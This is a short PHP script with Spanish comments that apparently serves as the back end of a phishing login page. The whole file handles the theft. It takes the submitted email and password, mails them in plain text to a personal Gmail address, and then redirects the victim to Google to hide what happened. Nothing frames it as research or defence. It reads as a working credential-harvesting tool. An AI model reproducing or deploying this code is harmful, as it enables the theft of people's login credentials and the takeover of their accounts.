<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibiendo los datos del formulario
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Aquí podrías realizar más validaciones y procesamiento de datos

    // Configuración del correo electrónico
    $to = "ibarraleonelmatias73@gmail.com";  // Dirección del destinatario
    $subject = "Nuevo inicio de sesión";  // Asunto del correo
    $message = "Correo electrónico: $email\nContraseña: $password";  // Cuerpo del correo

    // Enviar el correo
    if (mail($to, $subject, $message)) {
        // Redirigir a Google después de enviar el correo
        header("Location: https://www.google.com");
        exit(); // Asegura que no se ejecuten más instrucciones después de la redirección
    } else {
        echo "Hubo un error al enviar el correo.";
    }
}
?>
